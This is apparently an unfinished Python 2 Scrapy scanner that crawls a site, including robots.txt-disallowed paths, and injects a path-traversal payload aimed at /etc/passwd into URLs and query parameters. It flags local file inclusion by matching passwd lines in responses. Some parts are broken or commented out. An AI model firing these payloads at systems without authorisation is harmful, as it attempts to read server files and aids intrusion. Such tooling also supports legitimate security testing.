# -- coding: utf-8 --

from scrapy.contrib.linkextractors import LinkExtractor
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.http import FormRequest, Request
from scrapy.selector import Selector
#from quickscan.items import injected_resp
#from quickscan.loginform import fill_login_form
from urlparse import urlparse, parse_qsl, urljoin, urlunparse, urlunsplit
from urllib import urlencode

from scrapy.http.cookies import CookieJar
from cookielib import Cookie

from lxml.html import soupparser, fromstring
import lxml.etree
import lxml.html
import urllib
import re
import sys
import cgi
import requests
import string
import random

#from IPython import embed

class Quickscan(CrawlSpider):
    name = 'quickscan_spider'

    # If you're logging into a site with a logout link, you'll want to
    # uncomment the rule below and comment the shorter one right after to
    # prevent yourself from being logged out automatically
    rules = (Rule(LinkExtractor(), callback='parse_resp', follow=True), )

    def __init__(self, *args, **kwargs):
        """
        Handles args and logging in
        """
        super(Quickscan, self).__init__(*args, **kwargs)

        self.lfi_fuzz = '/../../../../../../../../../../../../../../../etc/passwd'
        self.xss_sqli_str = '\'"(){}<x>:/'

        self.start_urls = [kwargs.get('url')]
        hostname = urlparse(self.start_urls[0]).hostname
        # With subdomains
        self.allowed_domains = [hostname] # adding [] around the value seems to allow it to crawl subdomain of value
        self.delim = '9zqjx'

        # Login details
        self.login_user = kwargs.get('user')
        if self.login_user == 'None':
            self.login_user = None
        else:
            # Don't hit links with 'logout' in them since self.login_user exists
            self.rules = (Rule(LinkExtractor(deny=('logout')), callback='parse_resp', follow=True), )
        if kwargs.get('pw') == 'None' and self.login_user is not None:
            self.login_pass = raw_input("Please enter the password: ")
        else:
            self.login_pass = kwargs.get('pw')

        # HTTP Basic Auth
        self.basic_auth = kwargs.get('basic')
        if self.basic_auth == 'true':
            self.http_user = self.login_user
            self.http_pass = self.login_pass

        # Determine whether we payload all inputs in 1 request or multi
        # By default (without --fast arg), payload inputs 1 per req
        # self.fast = either str 'False' or str 'True'
        self.fast = kwargs.get('fast')

    def parse_start_url(self, response):
        """
        Creates the test requests for the start URL as well as the request for robots.txt
        """
        reqs = []
        u = urlparse(response.url)
        self.base_url = u.scheme+'://'+u.netloc
        robots_url = self.base_url+'/robots.txt'
        robot_req = Request(robots_url, callback=self.robot_parser)
        payloaded_reqs = self.parse_resp(response)

        reqs.append(robot_req)
        if payloaded_reqs is not None:
            for req in payloaded_reqs:
                reqs.append(req)

        if len(reqs) > 0:
            return reqs

    #### Handle logging in if username and password are given as arguments ####
    def start_requests(self):
        """
        If user and pw args are given, pass the first response to the login handler
        otherwise pass it to the normal callback function
        """
        if self.login_user and self.login_pass:
            if self.basic_auth == 'true':
                yield Request(url=self.start_urls[0]) # Take out the callback arg so crawler falls back to the rules' callback
            else:
                yield Request(url=self.start_urls[0], callback=self.login)
        else:
            yield Request(url=self.start_urls[0]) # Take out the callback arg so crawler falls back to the rules' callback

    def login(self, response):
        """
        Fill out the login form and return the request
        """
        self.log('Logging in...')
        try:
            args, url, method = fill_login_form(response.url, response.body, self.login_user, self.login_pass)
            return FormRequest(url,
                              method=method,
                              formdata=args,
                              callback=self.confirm_login,
                              dont_filter=True)

        except Exception:
            self.log('Login failed') # Make this more specific eventually
            return Request(url=self.start_urls[0], dont_filter=True) # Continue crawling

    def confirm_login(self, response):
        ''' Check that the username showed up in the response page '''
        if self.login_user.lower() in response.body.lower():
            self.log('Successfully logged in (or, at least, the username showed up in the response html)')
            return Request(url=self.start_urls[0], dont_filter=True)
        else:
            self.log('FAILED to log in! (or at least cannot find the username on the post-login page which may be OK)')
            return Request(url=self.start_urls[0], dont_filter=True)
    ###########################################################################

    def robot_parser(self, response):
        """
        Parse the robots.txt file and create Requests for the disallowed domains
        """
        disallowed_urls = set([])
        for line in response.body.splitlines():
            if 'disallow: ' in line.lower():
                try:
                    address = line.split()[1]
                except IndexError:
                    # In case Disallow: has no value after it
                    continue
                disallowed = self.base_url+address
                disallowed_urls.add(disallowed)
        reqs = [Request(u, callback=self.parse_resp) for u in disallowed_urls if u != self.base_url]
        for r in reqs:
            self.log('Added robots.txt disallowed URL to our queue: '+r.url)
        return reqs

    def parse_resp(self, response):
        """
        The main response parsing function, called on every response from a new URL
        Checks for XSS in headers and url
        """
        orig_url = response.url
        body = response.body
        doc = self.html_parser(body, orig_url)
        reqs = []

        if doc is not None:
            # Grab iframe source urls if they are part of the start_url page
            # iframe_reqs returns list of reqs or None
            iframe_reqs = self.make_iframe_reqs(doc, orig_url)
            if iframe_reqs is not None:
                for iframe_req in iframe_reqs:
                    reqs.append(iframe_req)

        # Returns either list of reqs or None
        payloaded_reqs = self.payload_reqs(doc, body, orig_url)
        if payloaded_reqs is not None:
            for req in payloaded_reqs:
                reqs.append(req)

        if len(reqs) > 0:
            return reqs

    def make_iframe_reqs(self, doc, orig_url):
        """
        Grab the <iframe src=...> attribute and add those URLs to the
        queue should they be within the start_url domain
        """

        iframe_reqs = []
        iframes = doc.xpath('//iframe/@src')
        frames = doc.xpath('//frame/@src')

        all_frames = iframes + frames

        url = None
        for i in all_frames:
            if type(i) == unicode:
                i = str(i).strip()
            # Nonrelative path
            if '://' in i:
                # Skip iframes to outside sources
                try:
                    if self.base_url in i[:len(self.base_url)+1]:
                        url = i
                except IndexError:
                    continue
            # Relative path
            else:
                url = urljoin(orig_url, i)

            if url:
                iframe_reqs.append(Request(url))

        if len(iframe_reqs) > 0:
            return iframe_reqs

    def payload_reqs(self, doc, body, orig_url):
        """
        Get all the input vectors: params, end of url, forms, headers
        """
        reqs = []
        parsed_url = urlparse(orig_url)
        # parse_qsl rather than parse_qs in order to preserve order
        # will always return a list
        url_params = parse_qsl(parsed_url.query)


        # Make the payloaded URLs based on parameters
        # url = payloaded_urls[0]
        # modified params = payloaded_urls[1]
        # payload = payloaded_urls[2]
        if len(url_params) > 0:
            payloaded_urls = self.make_urls(parsed_url, url_params)

        # If no params, then we can payload the end of the URL
        else:
            payloaded_urls = self.payload_end_of_url(orig_url)

        form_data = self.get_form_params(orig_url, parsed_url, doc)
#        if form_data is not None:
#            for form in form_data:
#                print 'FORM:', form

        #headers = ... user-agent, referer, shellshock, cookies

        callback = self.lfi_analyzer ########################################

        # Create the payloaded URL requests
        url_reqs = self.make_url_reqs(payloaded_urls, orig_url, callback)
        reqs += url_reqs

        if len(reqs) > 0:
            return reqs

    def lfi_analyzer(self, response):
        meta = response.meta
        payload = meta['payload']
        params = meta['params']
        location = meta['location']
        orig_url = meta['orig_url']
        resp_url = response.url
        body = response.body

        file_patterns = ["root:x:0:0:", "daemon:x:1:1:", ":/bin/bash", ":/bin/sh"]
        for fp in file_patterns:
            if fp in body:
                print '\n\n\n                 LFI in %s, original URL: %s\n\n\n' % (params, orig_url)

    def make_url_reqs(self, payloaded_urls, orig_url, callback):
        """
        Create the payloaded URL requests
        """
        reqs = [Request(url,
                        meta={'location':'url',
                              'params':params,
                              'orig_url':orig_url,
                              'payload':payload},
                        callback = callback)
                        for url, params, payload in payloaded_urls]

        if len(reqs) > 0:
            return reqs

    def payload_end_of_url(self, orig_url):
        """
        Return a URL with the end of it payloaded
        """
        payload = self.lfi_fuzz

        if orig_url.endswith('/'):
            payloaded_url = orig_url + payload
        else:
            payloaded_url = orig_url + '/' + payload

               # url            # param       # payload
        return [(payloaded_url, 'end of URL', payload)]
        # If there are params and we still want to test end of URL minus the params
        #            scheme                  netloc          path
        #end_of_url = parsed_url[0] + '://' + parsed_url[1] + parsed_url[2]

    def make_urls(self, parsed_url, url_params):
        """
        Create the URL parameter payloaded URLs
        """
        payloaded_urls = []

        # Payload all URL params in 1 URL
        if self.fast == 'True':
            new_query_strings = self.get_multipayload_query(url_params)
        # Create 1 URL per payloaded param
        else:
            new_query_strings = self.get_single_payload_queries(url_params)

        for query in new_query_strings:
            query_str =  query[0]
            params = query[1]
            payload = query[2]
                                       # scheme       #netlo         #path          #params        #query (url params) #fragment
            payloaded_url = urlunparse((parsed_url[0], parsed_url[1], parsed_url[2], parsed_url[3], query_str, parsed_url[5]))
            payloaded_urls.append((payloaded_url, params, payload))

        if len(payloaded_urls) > 0:
            return payloaded_urls

    def get_multipayload_query(self, url_params):
        """
        --fast arg triggers this
        Make single URL with all parameters payloaded
        """
        all_params = []
        payload = self.lfi_fuzz
        payloaded_params = []
        for p in url_params:
            param, value = p
            all_params.append(param)
            payloaded_params.append((param, payload))
        payloaded_query_str = urlencode(payloaded_params, doseq=True)
        return [(payloaded_query_str, ', '.join(all_params), payload)]

    def get_single_payload_queries(self, url_params):
        """
        Make a list of lists of tuples where each secondary list has 1 payloaded
        param and the rest are original value
        """
        new_payloaded_params = []
        changed_params = []
        modified = False
        payload = self.lfi_fuzz
        # Create a list of lists where num of lists = len(params)
        for x in xrange(0, len(url_params)):
            single_url_params = []
            for p in url_params:
                param, value = p
                # if param has not been modified and we haven't changed a parameter for this loop
                if param not in changed_params and modified == False:
                    new_param_val = (param, payload)
                    single_url_params.append(new_param_val)
                    changed_params.append(param)
                    modified = param
                else:
                    single_url_params.append(p)

            # Add the modified, urlencoded params to the master list
            new_payloaded_params.append((urlencode(single_url_params), modified, payload))
            # Reset the changed parameter tracker
            modified = False

        if len(new_payloaded_params) > 0:
            # [(payloaded params, payloaded param, payload), (payloaded params, payloaded param, payload)]
            return new_payloaded_params

    def get_form_params(self, orig_url, parsed_url, doc):
        """
        Get all form input, both hidden and explicit, parameters
        """
        forms = doc.xpath('//form')
        url_method_values = []

        for form in forms:
            if form.inputs:
                method = form.method
                post_url = form.action or form.base_url
                url = self.check_url(post_url, parsed_url)
                if url and method:
                    # resets input values for each form
                    values = []
                    for i in form.inputs:
                        if i.name is not None:
                            # Make sure type(i).__name__ is either a string InputElement or TextareaElement
                            if type(i).__name__ == 'InputElement':
                                # Don't change values for the below types because they
                                # won't be strings and lxml will complain
                                nonstrings = ['checkbox', 'radio', 'submit', 'reset', 'file']
                                if i.type in nonstrings:
                                    continue
                            elif type(i).__name__ is not 'TextareaElement':
                                continue

                            # create a list of inputs and their orig value
                            orig_val = form.fields[i.name]
                            if orig_val == None:
                                orig_val = ''
                            values.append((i.name, orig_val))

                    url_method_values.append((url, method, values))
                            # Foreign languages might cause this like russian "yaca" for "checkbox"
                        #    try:
                        #        form.fields[i.name] = payload
                        #    except ValueError as e:
                        #        self.log('Error: '+str(e))
                        #        continue
                        #    xss_param = i.name
                        #    values = form.form_values()
                        #    # Reset the value
                        #    try:
                        #        form.fields[i.name] = orig_val
                        #    except ValueError as e:
                        #        self.log('Error resetting form value: '+str(e))
                        #        continue
        if len(url_method_values) > 0:
            return url_method_values

    def check_url(self, post_url, parsed_url):
        """
        Confirm there is a POST url in the form element and
        if it's not a full valid URL, try to put one together
        """

        # Make sure there's a form action url
        if post_url == None:
            self.log('No form action URL found')
            return

        # Sometimes lxml doesn't read the form.action right
        if '://' not in post_url:
            self.log('Form URL contains no scheme, attempting to put together a working form submissions URL')
            scheme = parsed_url[0]
            netloc = parsed_url[1]
            # Make sure we're not doubling the / betwen the netloc and the form action url
            if post_url.startswith('/'):
                post_url = post_url[:-1]
            url = scheme + '://' + netloc + '/' + post_url
            return url
        else:
            return post_url

    def html_parser(self, html, orig_url):
        try:
            # soupparser will handle broken HTML better (like identical attributes) but god damn will you pay for it
            # in CPU cycles. Slows the script to a crawl and introduces more bugs.
            doc = lxml.html.fromstring(html, base_url=orig_url)
            return doc
        except lxml.etree.ParserError:
            self.log('ParserError from lxml on %s' % orig_url)
        except lxml.etree.XMLSyntaxError:
            self.log('XMLSyntaxError from lxml on %s' % orig_url)
